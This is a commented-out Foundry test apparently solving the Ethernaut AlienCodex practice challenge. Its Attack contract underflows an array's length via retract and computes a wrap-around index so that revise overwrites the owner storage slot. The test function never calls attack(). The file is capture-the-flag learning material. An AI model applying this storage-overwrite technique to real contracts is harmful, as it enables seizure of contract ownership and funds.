// // SPDX-License-Identifier: Unlicense
// pragma solidity ^0.8.0;

// import "forge-std/Test.sol";
// import "src/19_AlienCodex.sol";

// contract AlienCodexTest is Test {
//     AlienCodex instance;
//     Attack attacker;
//     address player1;

//     function setUp() public {
//         player1 = vm.addr(1);

//         instance = new AlienCodex();

//         attacker = new Attack(address(instance));
//     }

//     function testattacker() public {
//         vm.startPrank(player1, player1);
//         assertEq(instance.owner(), player1);
//         vm.stopPrank();
//     }
// }

// contract Attack is Test {
//     AlienCodex instance;

//     constructor(address fb) {
//         instance = AlienCodex(fb);
//     }

//     function attack() public {
//         instance.makeContact();
//         instance.retract();

//         unchecked {
//             uint index = uint256(2) ** uint256(256) -
//                 uint256(keccak256(abi.encode(uint256(1))));
//             instance.revise(index, bytes32(uint256(uint160(msg.sender))));
//         }
//     }
// }
